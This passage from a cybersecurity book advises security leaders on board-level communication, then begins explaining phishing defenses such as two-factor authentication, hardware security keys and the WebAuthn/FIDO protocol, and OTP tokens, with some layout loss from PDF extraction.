Chapter 10, we share  specific ideas and actions tailored for your role.  As we mentioned in Chapter 1, as per research conducted by Gary  McGraw and his teams at Synopsys and Cigital, there are four “tribes”  of CISOs.1 Seasoned executives in security roles who help as enablers,  technology leaders, and compliance leaders may be most likely to get  invited to board meetings. Security leaders whose organizations are  mostly viewed as cost centers and not viewed strategically may not. The  remainder of this chapter focuses on helping prepare security executives,  technology leaders, and compliance leaders to be invited to board  meetings. For those security leaders whose organizations are viewed  mostly as cost centers, we encourage you to build enough awareness about  the strategic importance of security and deliver results exhibiting that  strategic importance until you get invited to a board meeting.  1 CISO Report: Four CISO tribes and where to find them  Version 2.0 .

Elbayadi, Big Breaches, https:  doi.org 10.1007 978-1-4842-6655-7_11  251   Chapter 11    adviCe for teChnology and SeCurity leaderS   The Invitation to the Board Meeting As the CTO, CISO, or CIO, you might find yourself invited to a board  meeting to “give a ten to fifteen minute update on security.” You’re  immediately gripped by two emotions:  1  excited to get in front of the  entire board to share your insights—both the challenges and wins—and   2  you’re distraught by the limited time to convey so much complexity  and history. As you were only allotted 10–15 minutes, that probably gives  you 7 minutes to convey a compelling opening and then hopefully kick off  some interactive dialogue. The invite is not only an opportunity to give an  update but to engage with the board enough so that they invite you to the  next board meeting or follow up with you “offline.”  As you take your seat and mentally prepare to start your presentation   after introductions, the first question asked by a board member may throw  you for a loop: “So, are we secure?” asks one of the most senior board  members, followed by “How secure are we? Please tell us that we will not  be the next Target to be breached.”  Pun intended.   If these questions were perhaps not part of your rehearsed script, you  may begin to wonder how to not fall into the trap of a simple “yes” or “no.”  “Yes” is a trap because there is no system in the world that is 100% secure.  “No” is also a trap because the board may wonder what you’ve been up to  if you cannot claim that your organization is secure! This short section is  meant to provide some recommendations for increasing understanding  and getting more of what you need. The better relationship you have with  your board and the rest of the executive management team, the greater  the chances of building working partnerships that produce the results you  need.  252   Chapter 11    adviCe for teChnology and SeCurity leaderS   Tell a Story! Steve Jobs once said, “the most powerful person in the world is the  storyteller. The storyteller sets the vision, values and agenda of an entire  generation that is to come.” Cybersecurity has emerged as a leading  concern of executives around the world, and it appears it will remain so for  the foreseeable future. Your job is, in part, to teach and tell a compelling  story to alleviate those concerns and also further the organization’s  mission. Do not immediately attempt to, for instance, give a NIST-based  security framework assessment of your enterprise security posture—that  probably will not go as far with your board as telling a cohesive story,  providing important background and context. A security framework  assessment can indeed be valuable to review with the board but should  probably be reviewed after background and context are provided. As  the storyteller, you need to set the vision, values, and agenda for your  organization’s cybersecurity program.  If you are a CISO, you are the leader of one of the few functions in the   company that regularly lives in a real James Bond movie, with villains  and high drama. Every day, you and your team face talented, devious  adversaries trying to wreak havoc on the defenses you’ve implemented to  protect your organization. Take advantage of that background and create a  compelling story that will grip your listeners. Stories will increase interest  and engagement with your board and executive management. Human  beings often cannot help themselves but pay attention to a good story, and  a good story will also help them remember your presentation.  Some questions to consider as part of crafting your story may be:     Where did the company start with its security program?     Have there been significant incidents that resulted in  the formation or significant evolution of the security  program?  253   Chapter 11    adviCe for teChnology and SeCurity leaderS     How has your team been doing with the initial goals   and evolution of the program?     Are there some specific attacker groups that your team   has thwarted?  program?  unprepared for?     What do you think needs to be done next to evolve the      What threats do you feel your organization is still   Build rapport and credibility with the board. Get them asking   questions. Have some interactive discussion. Help them build  understanding. Share your insights. Be honest and transparent. Be sure to  get some coaching from your CEO or superiors on how they would like to  see you handle the conversation.  There is no faster way to lose your audience and the special opportunity   you have if you are speaking in acronyms and display numbers and figures  without context. Disembodied metrics and graphs will have them fetching  their phones. Stories also allow us to share pertinent knowledge, feelings,  and experience in ways both small and great.  We have seen so many presentations with lots of data and jargon, but  they rarely deliver the intended impact because they lack coherence and  context to the audience. Starting with storytelling works for most audiences.  As an example, back when Larry Page and Sergey Brin were running   Google on a day-to-day basis, they would often have engineering teams come  present to them on status of various projects. They would ask presenters to  review the page corresponding to their project in Google’s Project Database   PDB . As a technical lead at the time, I  Neil  decided to dispense with that in  a Google Product and Strategy  GPS  meeting I was invited to in late 2006 and  rather told Larry about a story that was not on the PDB page.  Although there was a line item on developing defenses against automated   bots that conduct click fraud, I told Larry the story of how a cybercriminal   254   Chapter 11    adviCe for teChnology and SeCurity leaderS  developed Clickbot.A,2 the first piece of named malware whose express intent  was to click ads on websites that cybercriminals ran so that they could get the  majority of the revenue associated with the ad clicks. As of May 2006, I had  been monitoring Clickbot.A3 in a lab to see which ads it was clicking. When I  had first started monitoring the clickbot, it was not clicking any Google ads. It  was also on at most a few hundred machines on the Internet.  In mid-June 2006, two weeks before the end of the financial quarter, I   saw two changes:  1  the clickbot clicked a Google AdSense ad, and  2  the  clickbot got deployed on over 100,000 machines on the Internet. Google’s  CFO at the time, given that it was just two weeks before the end of the quarter,  asked what material revenue Google should not take credit for given that  Clickbot.A’s automated ad clicks were fraudulent. I did not have the data  to immediately answer the question, but took it upon myself to find out so  that we could get back to the CFO in time before the end of the quarter. I  mobilized approximately three dozen engineers across the company and  slept at most 3 or 4 hours per night for two straight weeks to get to the answer:  the amount of click fraud that impacted Google was less than $50,000.  Although the dollar amount was fairly negligible compared to Google’s  quarterly revenue, the big lesson and key takeaway was that it made sense  for Google to invest in even more automated defenses against clickbots  so that dozens of engineers would not have to be mobilized in reaction to  each such threat. Three project ideas that I had to provide more automated  defenses were all funded. Telling the story instead of focusing on the status  lines on the PDB page paid off.  Just as telling the story helped in my meeting with Larry, telling the   board a story can help provide the board the background information and  context to allow them to support needed information security initiatives.  2 For more details, see “The Anatomy of Clickbot.A” which I co-authored and  presented at USENIX HotBots 2007. 3 Thanks to Eric Davis and Panda Labs for providing me with the Clickbot.A  malware sample!  255   Chapter 11    adviCe for teChnology and SeCurity leaderS   Create Context: What Are We Protecting? The context begins with the background of the story. Describing what we are  attempting to protect should be relevant and meaningful. With appropriate  background around what one is trying to protect, it should be almost  immediately clear as to why security is important for the health of the business!  In one of my  Moudy’s  former roles, my organization maintained   more than 50% of all American’s tax records and critical PII. Describing  the data sets that we had, as well as the many nefarious ways that attackers  can use the data, helped the executive team and the board understand why  certain investments were good business decisions. The description around  what data we had, where and how it was stored, and how it was being used  and transmitted allowed us to radically improve our security practices and  build capabilities at a faster pace.  Due to the way technology gets built over time, it is often helpful to  indicate the risks inherent in the business decisions that have occurred  over time. We acquired a small firm that had made only relatively small  investments in security and infrastructure, yet they also had critical  customer data residing on their network. Explaining the background that  some of the biggest risks were not from the larger, parent company where  many security investments had already been made but were due to the  multiple acquisitions was helpful to the board.  Board members and the executive team have many other demands   tugging at them, so it is up to you to weave your narrative by also including  how other companies with a similar profile experienced issues and were  exposed. We have attempted to educate and share much about the largest  breaches, so that can help inform your narrative as you share your context  and the parts of that context that matter the most when big breaches have  occurred.  256   Chapter 11    adviCe for teChnology and SeCurity leaderS   Lead with Your Approach to Fighting  Attackers, and Then Follow Up with Metrics! Lead the story with the kind of risks and attackers that might be motivated  to harm your business. Although this exercise should not be focused on  creating FUD—fear, uncertainty, and doubt—it should offer a realistic view  of the current threat landscape. It should also include the ways you’re trying  to slow attackers down and how your systems neutralize them. If you do not  have particular stories of how attackers have come after your organization,  you can leverage the first part of this book and set the context with incidents  and breaches that have affected peer organizations. For example, in one of  the firms we were advising, we were able to conclude that Chinese actors  attempted to break into the client’s autonomous machines with the intent to  break the system and reverse engineer it. The executive we presented to was  far more engaged as the actual threats and attempts became real. Once you  have established the important data in your organization’s possession, why  it’s worth protecting, and you have described the ways others in the industry  with a similar profile have been impacted, you can then lead your listener to:  what do we do about it next?  Avoid talking about the tools and technology—keep such topics   independent of your business narrative. These topics, while interesting to  discuss with other security and technology peers, will have less relevance  with board members who don’t live in that world  unless you have one or  more security technology experts on the board . If one of the ways you  were able to stop the bad guys, or at least see they were coming, was a new  tool that your CEO or the board had approved in a previous meeting, then  great! Weave that as part of the story but be sure that the tool technology  is part of the story, and not the story itself. Such an addition to the story  allows you to turn the CEO and the board into heroes in that story because  they were part of stopping the bad guys. A great leader rarely needs to  be the hero themselves. Great leaders often focus on giving credit to   257   Chapter 11    adviCe for teChnology and SeCurity leaderS  their teams who are doing the day-to-day work and execution and to the  superiors who empower themselves and their teams.  One of the ways to complete the story is to share data and metrics  about your security posture in a way that supports and reinforces the  broader narrative. If you watch news anchors, they use figures and images  to support the narrative. The data is displayed to reinforce the overall story  but never a substitute for the story itself.  Several years ago, we had a meeting with one of the powerful federal   agencies overseeing finance, and we were describing our security and  compliance program. We had an impressive CISO in terms of pedigree  and knowledge. Halfway through the meeting, the CEO took us aside and  turned to the CISO and said, “You’re doing a good job impressing them,  but all I’m hearing is acronyms and security jargon. Can you just tell them  how we’re protecting our customers’ personal information?” Let’s speak in  the language that executives and regulators understand, and let’s not hide  behind our technical vocabulary. The simple and clear language will win  trust and support over sounding smart. Speak in terms of customer trust.  Speak in terms of what events could hinder growth, what can we do that  would allow us to be more competitive in the marketplace, or what types of  business distractions can occur if there is a breach.  Metrics and quantitative measures, as described in Habit 5 of Chapter 9,    are important. Boards are used to seeing quantitative dashboards  measuring basic metrics such as total company revenue, expenses, profit  margins, and stock price. Although cybersecurity is a relatively young field,  we should be able to offer the board a quantitative metrics as well. Such  metrics are meant to support cybersecurity objectives and demonstrate  return on investment, but are not, in and of themselves, the end outcomes  that a CISO and their team strive to achieve.  Without metrics and measures, you can delude yourself into thinking   that your organization is more secure than it actually is. The converse is  also true—if you put too much faith into metrics and measures, you may  feel a false sense of security.  258   Chapter 11    adviCe for teChnology and SeCurity leaderS  There are two types of measures that are important: black-box  measures and white-box measures. Black-box measures look at an  organization’s security from the outside  as if the organization is a “black-  box” into which you cannot see inside  and assess security strictly as  someone who cannot see inside the organization. White-box measures  assess an organization’s security from the inside, with access to internal  information. The terms black-box and white-box come from the world of  physics and are applied here to information security.  Table 11-1 shows some examples of both black-box and white-box   security assessments, some of which are qualitative whereas others are more  quantitative. Also, it should be noted that all of the tests in Table 11-1 test  for different things. ISO 2700x and NIST 800-53 test for general information  security posture that could be applied to intellectual property, personally  identifiable customer data, or employee data. PCI focuses on credit card  numbers  also referred to as PANs, primary account numbers, in the PCI  compliance standard . BSIMM, the Building Security In Maturity Model, tests  for software security development maturity. Given the plethora of different  standards in the information security field, you can see why it is important to  avoid acronym soup when discussing cybersecurity at the board level.  Table 11-1.  Types of Security Standards  Qualitative  iSo 2700x pCi niSt CSf niSt 800-53 SoC2 type ii  White-box  Black-box  Quantitative  BSiMM openSaMM  SecurityScorecard BitSight QuadMetrics upguard  259   Chapter 11    adviCe for teChnology and SeCurity leaderS  For instance, a PCI compliance assessment tests whether or not  an organization has sufficient security controls to protect credit card  numbers. PCI compliance is qualitative because the result of the  assessment is typically a “pass” or a “fail” rather than a numeric result  specifying how effective or not are an organization’s security controls.  Also, a PCI assessment is subjective as, although there are prescriptive  guidelines, the assessment is conducted by one or more human Qualified  Security Assessors  QSAs , who serve as auditors. PCI is a white-  box assessment because the QSAs are given access to many internal  documents and reports and also conduct tests within the network of the  organization being assessed. ISO 2700x, NIST CSF, SOC2 Type II, and NIST  800-53 are also examples of qualitative, subjective, white-box tests because  the results are of the pass fail variety and are carried out by human  auditors who make the assessments by studying internal documents  reports and conducting internal tests.  By comparison, black-box security assessments conducted by  companies such as SecurityScorecard, BitSight, QuadMetrics, and  UpGuard are more quantitative and objective. Such assessments typically  involve automated scanning of an organization’s external security posture  and reporting via a numeric result or grade—0 to 100 for SecurityScorecard  with an associated A–F grade and 250 to 900 for BitSight, similar to a  credit score. Such external security posture assessments scan for website  security posture, email security posture, as well as a host of expanding  and ever-changing security posture data that can be observed externally.  QuadMetrics was initially based on algorithms that attempted to predict  the probability that any particular organization might get breached4  based on  machine learning models that incorporate features indicative  of externally observable security hygiene. However, at the time of writing  of this book, such approaches may or may not fully focus on all the root   4 https:  www.usenix.org conference usenixsecurity15 technical-sessions  presentation liu  260   Chapter 11    adviCe for teChnology and SeCurity leaderS  causes as identified in Chapter 1 of this book. We hope that such providers  incorporate such root causes into their scoring algorithms over time.  Finally, it should be noted that although such types of companies started  by only looking at external security posture, some such vendors may be  working to incorporate data about internal security posture as well.  BSIMM, similar to SecurityScorecard and BitSight, is quantitative in   that it reports on how many recognized software security practices an  organization systematically employs, but it is white-box and subjective, as  a BSIMM assessment primarily relies on interviewing staff members about  internal practices. BSIMM is also focused on assessing an organization’s  internal software security practices, whereas SecurityScorecard and  BitSight focus mainly on external information security posture.  Also, most of the assessments in Table 11-1 are fairly broad in what   they try to measure, whether they be assessment of an entire security  program or even part of it such as the software security program. Even  with a holistic, quantitative score, such measures may not indicate how  effective are individual countermeasures that target the root causes of  breach. As such, we provide in Table 11-2 examples of three representative  “micro-measurements” that indicate susceptibility to or effectiveness  against each of the root causes of breach. The representative examples that  we show in Table 11-2 could be used as is or could perhaps help motivate  your team to think about what to baseline and then improve upon quarter  by quarter to lower the probability that a breach can occur. Most of them  can be scientifically measured as team-level Objectives and Key Results, or  OKRs, as per performance management systems used by companies such  as Google and Intel.  261   Chapter 11    adviCe for teChnology and SeCurity leaderS  Table 11-2.

Connecting the dots is a step that can sometimes be missed by technology  leaders. Not understanding or explicitly making those connections  between business objectives and security projects will dampen their  perceived impact to the board. It is vital that you show up as a relevant  member of the executive team. You will want to know and have an  outstanding understanding of what peers in your organization are  planning and executing over the short- and long-term horizons. There is  nothing more disappointing than seeing technology and security leaders  out of touch with the businesses they manage. In our opinion, you need  to have as much mastery of the goals, vision, strategy, and P&L of the  business as much as any general manager, and we would suggest that it is  core to your role in leading digital businesses in our modern economy.  It is important to remain active and always track the revenue targets   of each business division or product segment and also educate your team  on the overall business strategy. Results from a technology or security  team are quite compelling when dots are connected from projects to the  business goals they are focused on enabling or achieving. Table 11-3 shows  examples of project goals stated in a way that does not connect the dots in  the left column and rephrased in a way that does connect the dots in the  right column. The first two examples connect the dots in a way that shows  how security projects enable a company to grow business, whereas the  second two examples connect the dots in a way that shows how security  projects mitigate risk.  263   Chapter 11    adviCe for teChnology and SeCurity leaderS  Table 11-3.

In our experience, as more spend shifts to digital channels,   establishing relationships with other executives in the business is also of  critical importance. For instance, Chief Marketing Officers  CMOs  have  continued to increase their technology spend, which often contributes to  many best of breed SaaS offerings that are interwoven with quarterly and  annual targets. Security leaders need to be fully aware and ensure that the  projects are executed with third-party SaaS providers in a secure fashion  rather than being blocked due to security policy or technology reasons. By  staying connected to the CMO, you can avoid a lot of misunderstanding  and slowing down the execution of growth strategies.  264   Chapter 11    adviCe for teChnology and SeCurity leaderS  At one level, an organization’s security strategy is focused on   engendering trust with its customers, partners, and so on. At a lower level,  security activities may run at odds with some company goals like “ship it  fast” or “break things and move quickly,” as Facebook learned. Security  is similar to quality in that it is often challenging to first build a product  fast and then make it a quality product. Quality needs to be baked in from  the beginning, as does security. Shipping a low-quality product will just  breed technical debt, just as it will allow digital cockroaches and security  vulnerabilities to grow.   Report on Security Events Calmly One of my  Moudy’s  favorite stories that demonstrates how to not handle  a security event or incident was a security engineer who had seen some  activities in firewall logs, which indicated a potentially unauthorized party  might have been connecting to our systems. Without much more than  seeing the logs and alerts, he was running around the office declaring,  “We’ve been breached! We’ve been breached!” in an attempt to get more  attention and resources focused on investigating the issue. Creating a  situation where misinformation gets communicated in emails, chats,  and other systems without full analysis is dangerous and unwarranted.  Engineers and technical teams often abuse the word “breach.” We  know they mean well, but in today’s social media frenzy, it can harm  the organization’s standing without actually meeting the definition of a  breach.  A data breach is a legal assessment that is made based on a deep   investigation, and that has determined that consumer PII has been  exfiltrated or exposed in a manner that triggers notification to state  attorney generals as per data breach notification laws. By comparison,  when malware infects a desktop computer, that is not necessarily a breach.  It may mean that a particular desktop has been compromised, but it does   265   Chapter 11    adviCe for teChnology and SeCurity leaderS  not necessarily mean that there was unencrypted consumer PII on that  desktop, nor that it was exfiltrated by an attacker. In the same way, an  Amazon S3 bucket that might have been left open to the public does not  necessarily mean that a breach has taken place. Depending upon what  data was or was not in the bucket; if it was exposed but never accessed  externally  as can be determined from access logs ; or if it was exposed,  indexed by a search engine, and accessed; can be important factors that a  legal team can consider to ascertain whether or not there was a breach.  Diligent and thoughtful investigation and reporting of security events,   especially at the board level, is important to ensure unnecessary legal,  regulatory, and compliance liability is not created, as well as avoiding  being viewed as a leader who “cries wolf.” At the same time, when there  are bona fide security incidents to report up based on hard data and  analysis, it is important to send the bad news up the chain of command  in a measured, calculated manner. Finally, in the case of a breach,  organizations should err on the side of transparency in order to maintain  trust with customers, consumers, and shareholders.   Summary In this chapter, we have provided advice on how to approach board-level  conversations about cybersecurity for security and technology leaders.  Security and technology leaders should prepare themselves for   opportunities to present to the board by being ready to tell a cohesive,  engaging story to provide background and context, explain the  organization’s data assets and protections in place, and then back up the  story with quantitative and qualitative measures and metrics as boards  are used to seeing for other areas of the business. In this chapter, we have  discussed various black-box and white-box assessments that can be used  to provide such measures and metrics, and we have also discussed various  micro-measurements that can quantitatively demonstrate effectiveness   266   Chapter 11    adviCe for teChnology and SeCurity leaderS  of an organization’s countermeasures against the root causes of breach.  Security and technology leaders should be able to connect the dots of  their programs to business strategies and initiatives. Finally, when security  events, incidents, or breaches need to be reported up to the board, they  should be reported in a calm, measured, and data-backed fashion.  Our hope is that following the approach outlined in this chapter   will allow for board-level cybersecurity conversations that will be more  constructive and effective than otherwise. We also hope and expect that  the advice outlined in this chapter will help drive organizations in a top-  down fashion that will lower the probability that an organization gets  breached, as well as help organizations deal with breaches in a manner  that salvages as much consumer and customer trust as possible.  267   CHAPTER 12  Technology Defenses  to Fight the Root  Causes of Breach:  Part One  There are a thousand hacking at the branches of evil to one  who is striking at the root.  —Henry David Thoreau, Walden  1854   In the first chapter of this book, we focused on identifying the root  causes of data breaches based on hard data from over 9,000 breaches.  Then, in the first part of this book, we provided examples of mega- breaches that occurred as a result of these root causes. The root causes are  phishing, malware, software vulnerabilities, third-party compromise or  abuse, unencrypted data, and inadvertent employee mistakes  separate  from phishing . We opened the second part of this book by delving into  the key habits that need to be cultivated to support a security program  oriented around continuous improvement. We followed up with advice to  leadership on how to have discussions about cybersecurity at the board  level.    Neil Daswani and Moudy Elbayadi 2021  N. Daswani and M. Elbayadi, Big Breaches, https:  doi.org 10.1007 978-1-4842-6655-7_12  269   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  In this chapter and the next, we provide more technical advice for  CISOs  Chief Information Security Officers , technology leaders, and  security leaders to address the root causes of breach in order to secure  an organization’s digital assets. In this chapter, we cover defenses  for phishing and malware. In the next chapter, we cover defenses for  software vulnerabilities, third-party compromise, unencrypted data, and  inadvertent employee mistakes. We break up our coverage in two chapters  only due to the amount of material to be covered.  If the organizations discussed in the first part of this book followed   the advice in these two chapters, it is most likely that none of them would  have been breached. The same holds true for the overwhelming majority  of the over 9,000 reported breaches from 2005 to 2020. It is important to  learn from history by employing the technology defenses discussed in  these chapters if we are to avoid similar data breaches from happening in  the future.  Note that we do not attempt to comprehensively cover every  possible type of technological defense in these chapters as that would  require another entire book.   The Challenge Many CISOs find themselves suffering “death from a thousand cuts” in  attempting to comply with every checkbox in an audit or finding their  attention split by dozens of priorities and many “urgent” approvals to keep  an organization moving. We put forth that if one of a CISO’s main goals is  to help prevent a breach altogether, then there are certain technologies  and processes they need to put in place in order to accomplish that goal.  CISOs, of course, have additional goals like helping regularly reduce  risk, and leading organizations in dealing with security incidents and  breaches  especially if they have inherited many of the risks due to  the organization’s legacy , but if we aren’t here to help prevent future  breaches, then what is the overall point?  270   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  Good  governance  is  not  fire-fighting  or  crisis-management.  Instead of opting for ad-hoc solutions the need of the hour is to  tackle the root cause of the problems.  —Narendra Modi, Prime Minister of India  As such, in this chapter, we walk through each of the root causes of breach   that we outlined in the first chapter of this book and describe what technologies  a CISO needs to use to significantly reduce or eliminate each of the root causes  of breach. Although the title for this chapter mentions technology defenses,  there are also supporting processes that may be required  e.g., vulnerability  management processes to fight third- party security vulnerabilities  which we  also describe in this chapter. We summarize by providing an example of a chart  at the end of Chapter 13 that CISOs can build for themselves to organize their  approach to addressing the root causes of breach, and what security tools1  they can employ to do so. The next two practical chapters connect your people  and process-oriented board-level strategy with the necessary technology  countermeasures to defend your organization.  Finally, we remark that putting countermeasures in place to deal   with root causes of data breaches is not sufficient to prevent all possible  forms of attack. For instance, in addition to being susceptible to data  breaches, companies that are dependent upon electronic commerce for  their revenue are also susceptible to distributed denial-of-service  DDoS   attacks, in which the attacker may seek to make a website unavailable to  process payment transactions. No data may be stolen, but a DDoS attack  that lasts long enough could cripple an online business. However, DDoS  attacks are out of scope of the discussion in this chapter  and this book  for that matter . At the same time, putting defenses in place to address the  root causes of data breaches makes up a majority of the countermeasures   1 In our descriptions and tables, as we refer to actual product names or company  names that may change, please check the www.bigbreaches.com site for the most  up-to-date product and company information.   271   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  that CISOs, technology, and security leaders need to put in place to protect  the crown jewel data in their organizations.   Phishing Defenses Phishing attacks have plagued the Internet since the mid-1990s. The first  public mention of the term phishing was on January 2, 1996, on a Usenet  newsgroup called AOHell  “America Online Hell”  as America Online was  one of the largest providers of Internet access in the United States in that  time period. It was possible for phishing attacks to be crafted so easily  because the Simple Mail Transfer Protocol  SMTP  used to exchange email  messages on the Internet did not authenticate the sender of an email.  Anyone could send an email to anyone else claiming to be whoever they  wanted to be, and claim to be from whatever organization they choose,  enabling impostor emails and phishing attacks.  In a successful phishing attack compromise, the victim trusts the   email message, in part because the victim  1  trusts that the identity of  the claimed sender in the “From:” part of the message is correct and   2  clicks a link in the email message to a login form on an impostor site  and inadvertently surrenders their password to the attacker. For this  reason, ensuring that users have a secondary factor—not just a password,  something that they know, to authenticate, but something that they have   e.g., a security key or mobile device  or something that they are  i.e., a  biometric —is essential to prevent data breaches.  In this section, we explore a variety of phishing countermeasures,   summarized and rated for impact effectiveness and cost complexity in  Table 12-1. The ratings of these countermeasures should be considered  subjective and are the opinions of the authors. Also, the countermeasures  are general categories of defense, and hence a particular implementation  of a countermeasure  e.g., a particular brand of security key  may have  more or less impact effectiveness or cost complexity than what we have  attributed to the specific category.  272   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  Table 12-1.  Impact and Complexity of Various Anti-phishing  Countermeasures  Impact  Effectiveness  security keys Dedicated otp  tokens  High  Mobile app 2fa authenticator sMs 2fa code Multi-factor authentication  more than  two factors  spf DKiM DMarC look-alike domain detection Credential stuffing checks password managers  Low  password complexity check password rotation  Low  High  Cost Complexity   Two-Factor Authentication  2FA  There are two major forces that have fueled further need for two-factor  authentication. First, many breaches produce more compromised  credentials which are added to attacker data sets that power the next  attempt to hack a vulnerable organization. The second force is that  consumers and employees still generally do not choose strong passwords.  In this section, we will discuss five forms of two-factor authentication,  from strongest to weakest defense:  1  security keys,  2  a dedicated one-  time password  OTP  device,  3  an authenticator application running on  a mobile device,  4  a mobile device that receives a second-factor code  via SMS, and  5  a second-factor code sent via email. Note that we do not  seek to be fully comprehensive in describing every possible two-factor  authentication option but describe these as representative examples.  273   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  DEPLOY 2FA RIGHT AWAY  We strongly encourage all organizations to enable two-factor authentication  everywhere possible, and especially for critical systems. the following are a  few examples of systems2 that support 2fa that can be enabled right away  using employee smartphones! Productivity and collaboration tools: Microsoft office 365, google g suite,  and slack. SaaS sites: salesforce, servicenow, and other systems of record hosted  externally Cloud services: aWs, azure, and gCp 2fa and more refined iaM roles Source code repositories: github and other source code repositories  in our discussion in this section, we will see that dedicated hardware security  keys are the best defense from a security perspective, but as they may require  a project and some cost to deploy them to all employees, we encourage  organizations to leverage their employee’s smartphones for 2fa as most  employees already have them. enabling 2fa on many online services using  smartphones is simply a configuration change, and a good starting point.  regardless of budget cycles and other priorities, defense against phishing  attacks can quickly be bolstered through enabling 2fa via mobile authenticator  apps that can be downloaded on most smartphones.   Security Keys One of the best secondary factors to date that one can use to virtually  eliminate the threat of phishing is to use hardware security keys, as Google and  Salesforce have done in the past for their employee base. Example security  keys manufactured by Yubico  called a YubiKey  are shown in Figure 12-1.  2 The interested reader is referred to https:  twofactorauth.org for a more  comprehensive list of systems that support 2FA.   274   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  Figure 12-1.  YubiKey security keys  Much in the same way that drivers insert a key to start a car, employees   insert their security key into their laptops, desktops, or mobile phones in  order to be able to log in to corporate sites and applications. A security  key is typically a hardware token that authenticates an employee only  when it is connected, and the employee taps the key. Security keys have a  dedicated, tamper-resistant piece of hardware embedded within them that  has secret key material associated with the user.  Tamper-resistant hardware and “secure enclaves”  described in the  “Data in Use” section later in Chapter 13  have also been integrated into  some mobile phones and could be used instead of a dedicated security key  on a daily basis that has to be inserted into the phone or a laptop. Google’s  Advanced Protection Program offers the capability for one to use a phone’s  built-in security key on an Android 7.0+ phone or on an iOS 10.0+ iPhone  with Google’s Smart Lock app.3  3 https:  landing.google.com advancedprotection   275   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  Some security keys on the market are based on the WebAuthn, FIDO2,  and U2F standards.4 From a technical standpoint, such security keys mimic  keyboards when plugged into a USB port.  We now provide a very simplified explanation of the protocol in which   the security key hardware engages to authenticate a user to a website. At  registration time when an employee is given a new security key, the security  key generates a public and private key pair.5 The private key is only known  to the security key hardware and can be used to digitally sign messages.  The public key can be used to verify the authenticity of signatures. At some  point after registration, the user may later on then connect to a website  using TLS,6 which sets up a confidential channel with the website that  authenticates the website but does not typically authenticate the user  even  though TLS does have support for that .  After the TLS connection is set up, the website can then authenticate   a user, as shown in Figure 12-2. After the user supplies a username and  password which is checked by the website, the website then generates a  “challenge”  a random, sufficiently long number  and sends a message  m   that consists of the challenge together with additional identifiers that are  specific to the website  the origin  and specific to the TLS connection  the  channel ID . Upon receipt, the security key hardware then digitally signs  the message and sends both the message  m  and the digital signature   s  to the website. The website then uses the public key to verify that the  digital signature on the message is authentic.   4 WebAuthn FIDO2 seeks to eliminate passwords completely and provides support  for both the first and second factors in authentication, whereas U2F focuses on  the second factor. 5 The reader is referred to Chapter 13 of Neil’s book Foundations of Security,  or many other available sources, for a basic explanation of how public-key  cryptography works. 6 TLS stands for Transport Layer Security and is the protocol that web browsers  and web servers use to communicate confidentially, in a way that a third-party  cannot eavesdrop, and most often authenticates the server but not the user.  276   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  Figure 12-2.  Authentication process7  How does WebAuthn FIDO prevent phishing? If an employee gets   lured to an impostor site and hands over their username and password,  possession of the username and password alone would not be sufficient  to impersonate the user. After checking the username and password,  the legitimate website will use the WebAuthn FIDO protocol to send a  challenge  essentially, a large random number  to the web browser. The  browser sends the challenge, the site’s domain name  e.g., bank.com ,  and channel ID to the security key. The security key generates a digital  signature attesting to the fact that the legitimate holder of the security key  wants to log in to the website  specified by the domain name “bank.com”   over the TLS connection.  When a phisher lures the user to an impostor site and prompts the   user to authenticate, the phisher may be able to get the user to enter their  legitimate username and password into the impostor site as we discussed.  However, a digital signature that contains the correct domain name must  be provided to the legitimate website for authentication to be successful.  A phisher may be able to send a challenge to the user’s security key when   7 Adapted from https:  developers.yubico.com U2F Protocol_details  Overview.html  277   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  the user is lured to an impostor site and obtain a digital signature from  the security key corresponding to the domain name of the impostor’s  site  e.g., fakebank.com , but not for the legitimate website  bank.com .  If the phisher attempts to be a “man-in-the-middle” and relays a digital  signature corresponding to the impostor site to the legitimate site, the  legitimate site will notice that the digital signature is for the impostor site  and the authentication will not be successful.  There are many details and corner cases to cover if we were to attempt  to mathematically prove the security of this process, and we do not attempt  to do so here—the gist of it is that the security key hardware is used to  generate an authenticated attestation that the legitimate user wants to  log in to a specific site. The digital signature generated by the security key  hardware serves as the hidden second-factor password that allows only the  legitimate user to log in.  We also note that all 2FA approaches described in this chapter do not   make a website un-phishable. Attackers can always set up an impostor  website that relays a username and password entered to the legitimate  website, force the legitimate website to send a two-factor code to the user   say via SMS to their mobile phone as described later in this chapter , and  then prompt the user to enter the two-factor code into the impostor site,  giving the attacker both the first and second factors needed to masquerade  as the user on the legitimate site. However, with WebAuthn FIDO, because  the web browser  as in Figure 12-2  verifies that the website’s domain  name matches the name in the TLS certificate of the website, an impostor  would have to forge the website’s TLS certificate in order to produce  a challenge for a security key that would allow them to log in to the  legitimate website.  Security keys offer the most effective defense discussed in this chapter  against phishing. Google reports that after deploying security keys in early  2017 to their employee base of over 85,000, they did not experience any   278   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  successful phishing or account takeover attacks over a year later—not one.  Google research published in 2019 also showed that security keys were  100% effective against automated bots, bulk phishing attacks, and targeted  attacks.8   Dedicated OTP Tokens Years before even smartphone and mobile devices became pervasive, one  option for a second factor based on “something-a-user-has” was dedicated  OTP devices. After a user enters a username and password, they are then  prompted to enter a code, typically six to eight digits, that is generated by a  small, dedicated hardware device. RSA’s SecurID is one such example of a  device that has been on the market for decades, shown in Figure 12-3.  Figure 12-3.  RSA SecurID, a dedicated OTP device  Dedicated OTP devices are less convenient due to having to carry  around a dedicated device. However, they are likely to be more secure  than an application on a mobile phone that runs many other applications  and has Internet access. Due to multiple uses and Internet access, mobile  phones are more likely to get infected with malware, and malware can  steal 2FA codes. Zitmo  “Zeus-in-the-mobile” , which attackers released  in September 2010, was one of the first known malware programs that  was able to steal 2FA codes. Finally, the algorithms used by dedicated   8 https:  security.googleblog.com 2019 05 new-research-how-effective- is-basic.html  279   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  OTP devices to generate 2FA codes are very similar to algorithms used in  mobile authenticator 2FA applications, and covering the very basics of  such algorithms first is good background. With all of that in mind, we now  describe how dedicated OTP devices work.  The dedicated OTP device shares an encryption key with the server  